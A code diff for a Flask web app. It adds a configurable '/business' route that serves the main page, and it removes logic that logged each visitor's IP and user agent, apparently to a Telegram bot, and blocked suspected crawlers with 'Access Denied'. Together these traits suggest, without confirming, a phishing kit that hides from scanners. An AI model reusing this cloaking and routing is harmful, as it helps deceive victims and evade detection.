@@ -30,6 +30,7 @@ DEFAULT_CONFIG = {
         "data_chatid": "",
         "data_token": "",
     },
+    "router": {"business_url": "/business"},
 }
 
 DEFAULT_VALUE = "Không có"
@@ -90,7 +91,7 @@ def get_config():
 def update_config():
     try:
         new_config = request.get_json()
-        if not all(key in new_config for key in ["settings", "telegram"]):
+        if not all(key in new_config for key in ["settings", "telegram", "router"]):
             return jsonify({"message": "Invalid config structure"}), 400
 
         if not all(key in new_config["settings"] for key in DEFAULT_CONFIG["settings"]):
@@ -98,6 +99,9 @@ def update_config():
 
         if not all(key in new_config["telegram"] for key in DEFAULT_CONFIG["telegram"]):
             return jsonify({"message": "Invalid telegram structure"}), 400
+
+        if not all(key in new_config["router"] for key in DEFAULT_CONFIG["router"]):
+            return jsonify({"message": "Invalid router structure"}), 400
 
         with open(CONFIG_FILE, "w", encoding="utf-8") as file:
             json.dump(new_config, file, indent=2)
@@ -132,24 +136,13 @@ def index():
 
 @app.route("/<path:path>")
 def catch_all(path):
-    user_agent = request.headers.get("User-Agent")
-    ip = request.headers.get("X-Forwarded-For")
-    if ip:
-        ip = ip.split(",")[0]
-    else:
-        ip = request.headers.get("X-Real-IP") or request.remote_addr
-    if ip == "127.0.0.1":
-        if os.path.exists(os.path.join(app.static_folder, path)):
-            return send_from_directory(app.static_folder, path)
-        else:
-            return render_template(INDEX_TEMPLATE)
-    send_visitor_info(ip, user_agent)
-    if is_bot(ip, user_agent):
-        return jsonify({"message": "Access Denied"}), 403
-    elif os.path.exists(os.path.join(app.static_folder, path)):
-        return send_from_directory(app.static_folder, path)
-    else:
+    with open(CONFIG_FILE, "r", encoding="utf-8") as config_file:
+        config = json.load(config_file)
+    business_url = config["router"]["business_url"].lstrip("/")
+
+    if path.startswith(business_url):
         return render_template(INDEX_TEMPLATE)
+    return send_from_directory(app.static_folder, path)
 
 
 def is_bot(ip, user_agent):
